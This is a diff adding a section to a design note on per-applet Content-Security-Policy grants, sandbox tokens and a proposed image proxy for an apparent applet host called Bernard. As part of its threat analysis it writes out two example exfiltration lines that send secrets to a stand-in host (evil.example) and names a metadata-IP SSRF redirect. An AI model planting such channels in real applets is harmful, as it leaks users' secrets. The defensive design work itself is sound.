@@ -184,3 +184,103 @@ Source: [quickjs-emscripten](https://github.com/justjake/quickjs-emscripten) · 
 - Attachments reaching a dispatch (#427) is what makes "describe this photo" work. It is a capability-layer gap, not a sandbox one.
 
 **Deliberately not researched:** container runtime selection, Docker Desktop licensing, per-applet container startup latency. All are moot under the decision above, and re-opening them belongs with a concrete use case that needs server-side execution.
+
+---
+
+## 5. What the seal costs, and what a user can lift (#467, #468)
+
+Added while implementing per-applet CSP grants. §4 above records where the
+browser sandbox fails; this records what it costs when it works, which is the
+half three separate issues had each been guessing at.
+
+### 5.1 What is measured, and what is cited
+
+Stated separately on purpose, because the difference is exactly what #468 asks
+to close and it is only half closed.
+
+**Measured on this machine, against the running host:**
+
+- The served header matches `cspFor()` byte for byte — no proxy, no browser,
+  nothing rewriting it in between.
+- A grant applies **per applet**: `news-headlines` granted
+  `img-src https://cdn.arstechnica.net https://ichef.bbci.co.uk` served exactly
+  that, while `demo` on its own port stayed byte-identical to the ungranted
+  baseline in the same instant.
+- A revoke applies **on the next request, with no restart** — the same running
+  daemon narrowed back to `img-src 'self' data:` immediately after
+  `bernard app csp news-headlines --img-src ""`. This is what the per-request
+  read buys, and a test fails when the value is captured at startup instead.
+
+**Cited, not measured:** that a `sandbox` header with no navigation token
+blocks a link click outright, including for a top-level document. Sources:
+[MDN CSP `sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox)
+and [w3c/webappsec-csp#647](https://github.com/w3c/webappsec-csp/issues/647),
+which is explicit that omitting `allow-top-navigation` "would prevent any
+redirections to any other page, even if triggered from within the sandboxed
+document; irrespective of whether they are triggered by a user or
+programmatically".
+
+The symptom matches: `~/.local/share/bernard/apps/news-headlines/index.html`
+builds every headline as `a.target = '_blank'` and reports that a normal click
+does nothing while ctrl+click works — consistent with the browser treating the
+latter as a chrome-level action rather than a navigation initiated by the
+sandboxed document.
+
+**Still outstanding:** the devtools session. Nothing here has been observed in a
+browser, so what is _not_ yet established is which token actually fixes the
+click, what the opened window can then do, whether
+`allow-popups-to-escape-sandbox` alone does anything without `allow-popups`,
+and whether the PWA install offer (#429) survives each token. Do not let the
+grant mechanism's existence be mistaken for that measurement having happened.
+
+### 5.2 The tokens, and what each one costs
+
+| Token                                     | Buys                                              | Costs                                                                                                                                                                       |
+| ----------------------------------------- | ------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `allow-popups`                            | `target="_blank"` opens a window                  | The popup **inherits the sandbox**: no scripts, no same-origin, no forms. An article opens broken, more confusingly than not opening. Never granted alone.                  |
+| `allow-popups-to-escape-sandbox`          | The opened window is an ordinary browsing context | Meaningless without `allow-popups`; `normalizeSandboxTokens` therefore stores the pair. `window.opener` stays live, so `rel="noopener"` matters — `page-validate.ts` warns. |
+| `allow-top-navigation-by-user-activation` | A plain `<a href>` navigates the tab              | The click **replaces the applet**. Right for "open the docs", wrong for a feed.                                                                                             |
+
+Never grantable, and enumerated in `csp-grant.ts` rather than left to judgement:
+`allow-top-navigation` (no activation requirement — drive-by), `allow-forms`
+(`form-action 'none'` closes an exfiltration channel `connect-src` does not
+cover), `allow-downloads`, `allow-modals`, and `allow-scripts` /
+`allow-same-origin`, which are unconditional already — naming them as grants
+would imply they could be withheld, and §4 explains why withholding
+`allow-same-origin` is the actively broken configuration.
+
+**A sandbox token is not origin-scoped**, and that is its real cost. There is no
+way to express "popups to nytimes.com only": the grant is "this applet may open
+windows", so a `window.open('https://evil.example/?d=' + secret)` behind a
+button is a channel. Weaker than `img-src` — it needs a user gesture and a
+window visibly appears — but real, and the CLI says so on every read.
+
+### 5.3 The image proxy, and why it is not the first answer
+
+#467 proposes `/__bernard/img?url=` as an alternative to widening `img-src`,
+on the grounds that it "keeps the exfiltration channel closed, which the CSP
+grant does not". **That reason is wrong**, and the correction matters more than
+the conclusion: `<img src="/__bernard/img?url=https://evil.example/?d=SECRET">`
+exfiltrates exactly as well, the request merely leaving from Bernard's socket
+instead of the browser's. What a proxy actually buys is that the channel becomes
+_observable, cappable and revocable_. That is real; it is not closure, and it
+needs the same per-applet allowlist the CSP grant needs before it closes
+anything.
+
+It also requires an SSRF primitive that exists nowhere in this repo —
+`src/tools/web.ts` calls bare `fetch` with no host checks. Doing it properly
+means scheme refusal, refusing loopback / private / link-local ranges
+**re-checked after every redirect** (a public host that 302s to
+`169.254.169.254` defeats a pre-flight check, and Node's `fetch` follows
+redirects internally, so this needs `redirect: 'manual'` and a hand-rolled
+loop), a size cap enforced while streaming, a content-type allowlist with SVG
+excluded, and — to close DNS rebinding — a custom dispatcher pinning the
+resolved address. Worth building when an applet needs origins that are not
+known in advance. The grant serves the motivating case, which is a feed pulling
+from a handful of named CDNs.
+
+Evidence for that being the shape of the real case: the applet that prompted
+both issues had already hand-built the proxy. `fetch-thumbs.sh` in its asset
+directory curls each thumbnail to local disk so the page can reference it
+same-origin — a workaround its author had to invent because there was no way to
+ask.
